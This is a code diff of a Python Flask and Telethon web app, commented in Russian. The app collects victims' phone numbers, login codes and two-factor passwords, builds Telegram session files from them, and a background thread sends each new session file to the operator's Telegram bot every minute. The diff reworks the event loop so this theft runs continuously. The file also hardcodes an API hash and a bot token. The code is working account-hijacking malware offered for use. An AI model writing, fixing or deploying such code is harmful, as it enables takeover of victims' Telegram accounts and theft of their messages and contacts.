@@ -3,22 +3,22 @@ from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 import os
 import asyncio
+import threading
 
 API_ID = 26006502
 API_HASH = "9afc2208b8cec0afe06c9c2bc15b53e4"
 
-BOT_TOKEN = "8213641387:AAF8mmuXPt0AjLd5z7fpZIdChOY16rB-GyM"
+BOT_TOKEN = "8213641387:AAF8mmuXPt0AjLd5z7fpZIdChOY16rB-GyM"  # токен бота
 CHAT_ID = 7440693813  # твой Telegram ID
 
 os.makedirs("sessions", exist_ok=True)
 
 app = Flask(__name__, template_folder="templates", static_folder="static")
 
-# Создаем главный event loop (один на все)
+# Главный event loop
 loop = asyncio.new_event_loop()
-asyncio.set_event_loop(loop)
 
-# Инициализируем TelegramClient для бота
+# Запуск бота в этом loop
 bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
 
 sent_files = set()
@@ -26,7 +26,6 @@ clients = {}
 
 
 async def send_new_sessions():
-    """Фоновая задача: отправляет новые .session файлы в бот"""
     while True:
         files = os.listdir("sessions")
         new_files = [f for f in files if f.endswith(".session") and f not in sent_files]
@@ -40,13 +39,23 @@ async def send_new_sessions():
         await asyncio.sleep(60)
 
 
+def start_loop():
+    asyncio.set_event_loop(loop)
+    bot.start(bot_token=BOT_TOKEN)  # Запускаем бота синхронно в этом потоке
+    loop.create_task(send_new_sessions())
+    loop.run_forever()
+
+
+threading.Thread(target=start_loop, daemon=True).start()
+
+
 def run_async(coro):
-    """Запускает корутину в основном loop синхронно"""
-    return loop.run_until_complete(coro)
+    """Запускает корутину внутри нашего loop и возвращает результат"""
+    return asyncio.run_coroutine_threadsafe(coro, loop).result()
 
 
 async def create_and_connect_client(session_name, phone):
-    """Создаем клиента и отправляем код"""
+    """Создаём клиента внутри основного loop"""
     client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
     await client.connect()
     await client.send_code_request(phone)
@@ -120,10 +129,5 @@ def password():
 
 
 if __name__ == "__main__":
-    # Запуск клиента бота и фоновой задачи
-    run_async(bot.start(bot_token=BOT_TOKEN))
-    loop.create_task(send_new_sessions())
-
     port = int(os.environ.get("PORT", 5000))
-    # Flask использует тот же поток и event loop
     app.run(host="0.0.0.0", port=port)
